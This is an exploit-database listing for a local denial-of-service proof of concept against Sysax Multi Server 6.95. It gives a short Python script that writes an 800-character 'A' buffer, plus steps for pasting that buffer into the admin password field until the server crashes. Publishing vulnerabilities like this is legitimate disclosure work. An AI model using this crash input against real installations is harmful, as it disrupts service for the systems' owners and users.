---
title: Sysax Multi Server 6.95 Password Denial of Service (PoC)
url: https://cxsecurity.com/issue/WLB-2023030054
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-28
fetch_date: 2025-10-04T10:49:44.548933
---

# Sysax Multi Server 6.95 Password Denial of Service (PoC)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sysax Multi Server 6.95 Password Denial of Service (PoC)** **2023.03.27**  Credit:  **[Luis Martinez](https://cxsecurity.com/author/Luis%2BMartinez/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Sysax Multi Server 6.95 - 'Password' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2022-10-05
# Vendor Homepage: https://www.sysax.com/
# Software Link: https://www.sysax.com/download/sysaxserv\_setup.msi
# Tested Version: 6.95
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: Windows 10 Pro x64 es
# Steps to Produce the Crash:
# 1.- Run python code: Sysax\_Multi\_Server\_6.95.py
# 2.- Open Sysax\_Multi\_Server\_6.95.txt and copy content to clipboard
# 3.- Open "Sysax Multi Server"
# 4.- Manage Server Settings...
# 5.- Administrative Settings -> Configure...
# 6.- Clic "Enable web based administration and API access"
# 7.- Login -> admin
# 8.- Paste ClipBoard on "Password"
# 9.- Save
# 10.- Crashed
#!/usr/bin/env python
buffer = "\x41" \* 800
f = open ("Sysax\_Multi\_Server\_6.95.txt", "w")
f.write(buffer)
f.close()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030054)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top